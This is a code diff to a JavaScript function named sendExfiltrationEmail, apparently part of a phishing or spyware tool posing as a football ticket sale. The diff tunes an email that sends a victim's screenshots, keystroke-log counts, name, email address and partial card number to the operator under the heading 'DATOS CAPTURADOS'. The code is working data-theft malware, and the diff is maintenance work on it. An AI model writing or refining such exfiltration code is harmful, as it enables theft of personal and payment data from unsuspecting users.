@@ -46,10 +46,12 @@ async function sendExfiltrationEmail(data, screenshotsDir, logFile) {
   userScreenshots.forEach((fileName, index) => {
     const filePath = path.join(screenshotsDir, fileName);
     if (fs.existsSync(filePath)) {
+      const ext = path.extname(fileName).toLowerCase();
+      const contentType = ext === '.jpg' || ext === '.jpeg' ? 'image/jpeg' : 'image/png';
       attachments.push({
-        filename: `screenshot_${index + 1}.png`,
+        filename: `screenshot_${index + 1}${ext}`,
         path: filePath,
-        contentType: "image/png",
+        contentType: contentType,
       });
       console.log(`   Agregado: ${fileName}`);
     }
@@ -66,19 +68,14 @@ async function sendExfiltrationEmail(data, screenshotsDir, logFile) {
               <p>
                   Usuario: ${user}<br>
                   Correo: ${email}<br>
-                  Partido: ${match || "N/A"}<br>
-                  Monto: $${totalAmount?.toLocaleString("es-MX") || "0"} MXN<br>
-                  Asientos: ${seats}<br>
+                  ${cardLastFour ? `Tarjeta: ****${cardLastFour}<br>` : ""}
                   Fecha: ${new Date().toLocaleString()}
-                  ${cardLastFour ? `<br>Tarjeta: ****${cardLastFour}` : ""}
               </p>
               <hr>
               <strong>DATOS CAPTURADOS:</strong>
               <ul style="padding-left: 20px;">
                   <li>Logs de Teclado: ${getLogCount(logFile)} registros</li>
                   <li>Capturas de Pantalla: ${userScreenshots.length}</li>
-                  <li>Datos de Formulario: Capturados</li>
-                  <li>Metadata: Timestamps, Navegador, IP</li>
               </ul>
               <p style="font-size: 11px; color: #666;">Archivos adjuntos en el correo.</p>
           </div>
